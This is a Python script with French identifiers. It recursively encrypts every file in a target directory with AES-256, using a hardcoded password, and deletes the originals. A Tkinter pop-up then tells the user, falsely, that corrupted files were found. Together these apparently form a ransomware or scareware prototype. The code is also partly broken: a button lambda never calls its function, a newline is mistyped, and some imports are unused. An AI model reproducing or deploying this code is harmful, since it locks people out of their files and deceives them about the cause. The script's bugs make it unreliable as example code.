
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.fernet import Fernet
import paramiko
import os
import tkinter as tk
from tkinter import messagebox, ttk


def generer_cle(password: str, salt: bytes) -> bytes:

    kdf =PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,  # Clé AES-256
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())


def chiffrer_fichier(fichier_source: str, fichier_chiffre: str, password: str):
    salt = os.urandom(16)
    iv = os.urandom(16)
    cle = generer_cle(password, salt)

    cipher = Cipher(algorithms.AES(cle), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    with open(fichier_source, "rb") as f:
        data = f.read()

    padder = PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    with open(fichier_chiffre, "wb") as f:
        f.write(salt + iv + encrypted_data)

    os.remove(fichier_source)

def dechiffrer_fichier(fichier_chiffre: str, fichier_dechiffre:str, password: str):
    with open(fichier_chiffre, "rb") as f:
        salt = f.read(16)
        iv = f.read(16)
        encrypted_data = f.read()

    cle = generer_cle(password, salt)

    cipher = Cipher(algorithms.AES(cle), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

    unpadder = PKCS7(128).unpadder()
    data = unpadder.update(padded_data) + unpadder.finalize()

    with open(fichier_dechiffre, "wb") as f:
        f.write(data)

    os.remove(fichier_chiffre)


def chiffrer_repertoire(repertoire: str, password: str):
    for racine, _, fichiers in os.walk(repertoire):
        for fichier in fichiers:
            chemin_fichier = os.path.join(racine, fichier)
            fichier_chiffre = chemin_fichier + ".enc"
            print(f"Chiffrement : {chemin_fichier} → {fichier_chiffre}")
            chiffrer_fichier(chemin_fichier, fichier_chiffre, password)



def dechiffrer_repertoire(repertoire:str, password:str):
    for racine, _, fichiers in os.walk(repertoire):
        for fichier in fichiers:
            if fichier.endswith(".enc"):
                chemin_fichier = os.path.join(racine, fichier)
                fichier_dechiffre = chemin_fichier[:-4] 
                print(f"Déchiffrement : {chemin_fichier} → {fichier_dechiffre}")
                dechiffrer_fichier(chemin_fichier, fichier_dechiffre, password)

if __name__ == "__main__":
    repertoire = "dev"
    mot_de_passe = "MonMotDePasseSecurise123"
    chiffrer_repertoire(repertoire, mot_de_passe)
    print("Chiffrement terminé.")

def fichier_corrompus(repertoire):
    fichiers_corrompus = []
    for racine, _, fichiers in os.walk(repertoire):
        for fichier in fichiers:
            if "corrompu" in fichier:  # Simule une détection (par exemple, nom de fichier)
                fichiers_corrompus.append(os.path.join(racine, fichier))
    return fichiers_corrompus
 
def afficher_fichiers_corrompus(repertoire):
    fichiers = fichier_corrompus(repertoire)
    if not fichiers:
        fenetre = tk.Tk()
        fenetre.withdraw()
        tk.messagebox.showinfo(
            "Aucun problème détecté",
            f"Le répertoire '{repertoire}' ne contient aucun fichier corrompu."
        )
        return
    
    fenetre_liste = tk.Toplevel()
    fenetre_liste.title("Fichiers corrompus")
    fenetre_liste.geometry("400x300")

    label = tk.Label(fenetre_liste, text="Voici les fichiers détectés comme corrompus :", font=("Arial", 12))
    label.pack(pady=10)

    liste_fichiers = ttk.Treeview(fenetre_liste, columns=("chemin"), show="headings", height=8)
    liste_fichiers.heading("chemin", text="Nom du fichier")
    liste_fichiers.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    for fichier in fichiers:
        liste_fichiers.insert("", "end", values=(fichier,))

    bouton_fermer = tk.Button(fenetre_liste, text="Fermer", command=fenetre_liste.destroy)
    bouton_fermer.pack(pady=10)

def alerte_corruption(repertoire):

    fenetre = tk.Tk()
    fenetre.title("Alerte de Corruption de Fichiers")
    fenetre.geometry("400x200")

    label = tk.Label(
        fenetre,
        text="Attention : Des fichiers corrompus ont été détectés !",
        font=("Arial", 14),
        fg="red"
    )
    label.pack(pady=20)

    bouton_voir_fichiers = tk.Button(
        fenetre,
        text=f"Voir les fichiers corrompus détectés dans :/n{repertoire}",
        command=lambda: afficher_fichiers_corrompus,
        font=("Arial", 12)
    )
    bouton_voir_fichiers.pack(pady=10)

    bouton_ok = tk.Button(
        fenetre,
        text="OK",
        command=fenetre.destroy,
        font=("Arial", 12)
    )
    bouton_ok.pack(pady=10)

    fenetre.mainloop()

if __name__ == "__main__":
    repertoire_ciblé = r"/home/rhema/Documents/dev"
    alerte_corruption(repertoire_ciblé)
    
